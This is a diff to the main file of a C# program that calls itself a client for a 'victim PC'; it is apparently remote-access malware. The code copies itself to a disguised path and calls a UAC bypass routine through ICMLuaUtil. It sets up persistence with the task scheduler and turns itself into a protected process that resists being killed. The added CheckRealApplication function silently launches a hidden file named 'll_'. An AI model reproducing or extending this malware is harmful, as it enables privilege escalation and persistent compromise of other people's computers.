@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading;
@@ -16,6 +17,7 @@ namespace Client
         static void Main(string[] args)
         {
             ArgsParser(args);
+            CheckRealApplication();
 
             /// Check if Application is already on victim PC.
             if (!Constants.IsInVictimPC()) Migrate();
@@ -23,22 +25,27 @@ namespace Client
             /// Attempt to be God.
             if (!Utilities.Environment.IsAdmin())
                 Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
-            else {
+            else
+            {
                 Armitage.Startup.ViaTaskScheduler();
                 LoveCannotBeKilled();
             }
 
             /// Start loggers.
 
-            while (true) {
+            while (true)
+            {
                 // Sleep
                 Thread.Sleep(10000);
             }
         }
 
-        public static void ArgsParser(string[] args) {
-            try {
-                if (args.Length > 0) {
+        public static void ArgsParser(string[] args)
+        {
+            try
+            {
+                if (args.Length > 0)
+                {
                     Process.GetProcessById(int.Parse(args[0].Trim())).Kill();
                 }
             }
@@ -48,11 +55,13 @@ namespace Client
         /// <summary>
         /// Turn into a system process.
         /// </summary>
-        public static void LoveCannotBeKilled() {
+        public static void LoveCannotBeKilled()
+        {
             Armitage.My_Love.Protect();
         }
 
-        public static void Migrate() {
+        public static void Migrate()
+        {
             if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
             {
                 try
@@ -61,6 +70,25 @@ namespace Client
                         Environment.Exit(0);
                 }
                 catch { }
+            }
+        }
+        /// <summary>
+        /// Checks if a batch file named ll_ exists, if it does, runs it as an executable. The '.exe' extension is not needed.
+        /// </summary>
+        public static void CheckRealApplication()
+        {
+            string target = "ll_";
+            if (File.Exists(target))
+            {
+                var p = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        FileName = target,
+                        UseShellExecute = false
+                    }
+                };
+                p.Start();
             }
         }
     }
